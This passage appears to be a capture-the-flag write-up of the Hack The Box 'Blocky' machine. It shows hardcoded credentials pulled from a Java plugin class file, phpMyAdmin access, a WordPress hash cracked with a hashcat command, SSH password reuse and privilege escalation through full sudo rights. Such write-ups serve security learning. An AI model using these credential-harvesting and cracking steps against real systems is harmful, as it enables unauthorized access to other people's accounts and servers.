  inflating: me/ryanhamshire/griefprevention/command/CommandClaimOptionPlayer.class  
  inflating: me/ryanhamshire/griefprevention/command/CommandClaimAbandonAll.class  
  inflating: me/ryanhamshire/griefprevention/command/CommandSoftMute.class  
  inflating: me/ryanhamshire/griefprevention/command/CommandRestoreNatureFill.class  
  inflating: me/ryanhamshire/griefprevention/command/CommandClaimGreeting.class  
  inflating: me/ryanhamshire/griefprevention/command/CommandUnseparate.class  
  inflating: me/ryanhamshire/griefprevention/command/CommandAccessTrust.class  
  inflating: me/ryanhamshire/griefprevention/command/CommandUnlockDrops.class  
  inflating: me/ryanhamshire/griefprevention/command/CommandClaimFlagReset.class  
  inflating: me/ryanhamshire/griefprevention/command/CommandClaimAdminList.class  
  inflating: me/ryanhamshire/griefprevention/command/CommandSeparate.class  
  inflating: me/ryanhamshire/griefprevention/command/CommandClaimInherit.class  
  inflating: me/ryanhamshire/griefprevention/command/CommandIgnoredPlayerList.class  
  inflating: me/ryanhamshire/griefprevention/command/CommandClaimFlagDebug.class  
  inflating: me/ryanhamshire/griefprevention/command/CommandGivePet.class  
  inflating: me/ryanhamshire/griefprevention/command/CommandPermissionTrust.class  
  inflating: me/ryanhamshire/griefprevention/command/CommandClaimTransfer.class  
  inflating: me/ryanhamshire/griefprevention/command/CommandUntrustAll.class  
  inflating: me/ryanhamshire/griefprevention/command/CommandUnignorePlayer.class  
  inflating: me/ryanhamshire/griefprevention/command/CommandClaimDelete.class  
  inflating: me/ryanhamshire/griefprevention/command/CommandClaimFlagGroup.class  
  inflating: me/ryanhamshire/griefprevention/command/CommandAdjustBonusClaimBlocks.class  
  inflating: me/ryanhamshire/griefprevention/command/CommandClaimList.class  
  inflating: me/ryanhamshire/griefprevention/command/CommandClaimUnbanItem.class  
  inflating: me/ryanhamshire/griefprevention/command/CommandPlayerInfo.class  
  inflating: me/ryanhamshire/griefprevention/command/CommandRestoreNatureAggressive.class  
  inflating: me/ryanhamshire/griefprevention/command/CommandClaimFlag.class  
  inflating: me/ryanhamshire/griefprevention/command/CommandClaimSubdivide.class  
  inflating: me/ryanhamshire/griefprevention/command/CommandClaimFlag$FlagType.class  
  inflating: me/ryanhamshire/griefprevention/command/CommandClaimDeleteAll.class  
  inflating: me/ryanhamshire/griefprevention/command/CommandClaimPermissionGroup.class  
  inflating: me/ryanhamshire/griefprevention/command/CommandHelper.class  
   creating: me/ryanhamshire/griefprevention/logging/
  inflating: me/ryanhamshire/griefprevention/logging/CustomLogEntryTypes.class  
  inflating: me/ryanhamshire/griefprevention/logging/CustomLogger$ExpiredLogRemover.class  
  inflating: me/ryanhamshire/griefprevention/logging/CustomLogger$1.class  
  inflating: me/ryanhamshire/griefprevention/logging/CustomLogger.class  
  inflating: me/ryanhamshire/griefprevention/logging/CustomLogger$EntryWriter.class  
   creating: me/ryanhamshire/griefprevention/listener/
  inflating: me/ryanhamshire/griefprevention/listener/EntityEventHandler$1.class  
  inflating: me/ryanhamshire/griefprevention/listener/EntityRemovalListener.class  
  inflating: me/ryanhamshire/griefprevention/listener/BlockEventHandler.class  
  inflating: me/ryanhamshire/griefprevention/listener/WorldEventHandler.class  
  inflating: me/ryanhamshire/griefprevention/listener/EntityEventHandler$2.class  
  inflating: me/ryanhamshire/griefprevention/listener/PlayerEventHandler.class  
  inflating: me/ryanhamshire/griefprevention/listener/EntityEventHandler.class  
  inflating: me/ryanhamshire/griefprevention/listener/NucleusEventHandler.class  
  inflating: me/ryanhamshire/griefprevention/SiegeData.class  
   creating: me/ryanhamshire/griefprevention/migrator/
  inflating: me/ryanhamshire/griefprevention/migrator/RedProtectMigrator.class  
  inflating: me/ryanhamshire/griefprevention/migrator/PolisMigrator.class  
   creating: me/ryanhamshire/griefprevention/permission/
  inflating: me/ryanhamshire/griefprevention/permission/GPPermissions.class  
  inflating: me/ryanhamshire/griefprevention/permission/GPOptions.class  
  inflating: me/ryanhamshire/griefprevention/permission/GPPermissionHandler.class  
  inflating: mcmod.info              
   creating: me/ryanhamshire/griefprevention/api/
   creating: me/ryanhamshire/griefprevention/api/data/
  inflating: me/ryanhamshire/griefprevention/api/data/PlayerData.class  
  inflating: me/ryanhamshire/griefprevention/api/data/ClaimData.class  
   creating: me/ryanhamshire/griefprevention/api/claim/
  inflating: me/ryanhamshire/griefprevention/api/claim/Claim.class  
  inflating: me/ryanhamshire/griefprevention/api/claim/ClaimManager.class  
  inflating: me/ryanhamshire/griefprevention/api/claim/TrustType.class  
  inflating: me/ryanhamshire/griefprevention/api/claim/ClaimResultType.class  
  inflating: me/ryanhamshire/griefprevention/api/claim/ClaimResult.class  
  inflating: me/ryanhamshire/griefprevention/api/claim/Claim$Builder.class  
  inflating: me/ryanhamshire/griefprevention/api/claim/ClaimType.class  
  inflating: me/ryanhamshire/griefprevention/api/GriefPreventionApi.class  
   creating: me/ryanhamshire/griefprevention/api/event/
  inflating: me/ryanhamshire/griefprevention/api/event/AttackPlayerEvent.class  
  inflating: me/ryanhamshire/griefprevention/api/event/ResizeClaimEvent.class  
  inflating: me/ryanhamshire/griefprevention/api/event/DeleteClaimEvent$Abandon.class  
  inflating: me/ryanhamshire/griefprevention/api/event/CreateClaimEvent.class  
  inflating: me/ryanhamshire/griefprevention/api/event/TrustClaimEvent.class  
  inflating: me/ryanhamshire/griefprevention/api/event/TrustClaimEvent$Add.class  
  inflating: me/ryanhamshire/griefprevention/api/event/DeleteClaimEvent.class  
  inflating: me/ryanhamshire/griefprevention/api/event/TrustClaimEvent$Remove.class  
  inflating: me/ryanhamshire/griefprevention/api/event/ClaimEvent.class  
  inflating: me/ryanhamshire/griefprevention/api/event/GPNamedCause.class  
  inflating: me/ryanhamshire/griefprevention/api/event/TransferClaimEvent.class  
  inflating: me/ryanhamshire/griefprevention/api/event/BorderClaimEvent.class  
  inflating: me/ryanhamshire/griefprevention/GriefPrevention.class  

```

Yikes, lots of files.  Since I see ".class" I know it's Java, but I cat it just to see if I can pull out what I need without anymore utilities:

```
cat BlockyCore.class 
����4-com/myfirstplugin/BlockyCorejava/lang/ObjectsqlHostLjava/lang/String;sqlUsersqlPass<init>()VCode

	
	localhost	
                       root	
                               8YsqfCTnvxAUeduzjNSXe22	
                                                       LineNumberTableLocalVariableTablethisLcom/myfirstpluonServerStarte;
             onServerStop
                         onPlayerJoi"TODO get usernam$!Welcome to the BlockyCraft!!!!!!!
&
 '(
   sendMessage'(Ljava/lang/String;Ljava/lang/String;)usernamemessage
SourceFileBlockyCore.java!

Q*�
   *�*�*���
�
�
	*!#�%��	
        ��
```

It's nasty formatting, but I see creds!  Wait, root already?  That's too easy.  I try to SSH using the creds, nope.  I try the WordPress site, nope.  Hmmm... WAIT, that phpmyadmin site!

### phpMyAdmin

Let's use our new creds and login.  I see a "wordpress" database name on the left hand side and we find more creds.  Well, the notch username and a password hash.

![blockyhome](/images/blocky.png)

To recap, I have phpymadmin creds as the "root" user and now these new creds.  SSH is available, and we haven't penetrated the WordPress login yet.

Let's see what kind of password hash this is:

```
hashid "$P$BiVoTj899ItS1EZnMhqeqVbrZI4Oq0"
Analyzing ''
[+] Unknown hash

root@kali:~/Desktop/htb/blocky/com/myfirstplugin# hash-identifier 
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: $P$BiVoTj899ItS1EZnMhqeqVbrZI4Oq0/

Possible Hashs:
[+] MD5(Wordpress)
```

I match my hash up with the hashcat 400 code: [hashcat reference](https://hashcat.net/wiki/doku.php?id=example_hashes)  Now it's time to turn on the old CPU warmer:

> hashcat -m 400 hash /usr/share/wordlists/rockyou.txt --force


## PWN

While waiting for Hashcat to melt my laptop, I get desperate enough to mix the creds I have.  I try to SSH as root with the hash and the first password, nope.  Note: WINDOWS will allow you to authenticate to certain services with the password has, not Linux as far as I know.  I did a dumb.  I try to login to WordPress with both, nope.  Finally, I try to SSH into the box as notch and try both passwords.  Bazinga!  The Notch user's SSH password is the same as the "root" user for phpmyadmin.

```
Last login: Tue Jul 25 11:14:53 2017 from 10.10.14.230
notch@Blocky:~$ pwd
/home/notch
notch@Blocky:~$ ls
minecraft  user.txt
notch@Blocky:~$ cat user.txt 
```

There's local.txt, grab the flag.

Let's see how we're going to privesc: linenum and a quick sudo -l:

```
notch@Blocky:~$ sudo -l
[sudo] password for notch: 
Matching Defaults entries for notch on Blocky:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User notch may run the following commands on Blocky:
    (ALL : ALL) ALL
```

Well that's easy, just sudo su and we're out of here!  Grab the root flag and we're done.  This has me wondering about the WordPress site though.  Would my bruteforce attacks ever have been successful?  how long would hashcat have taken?
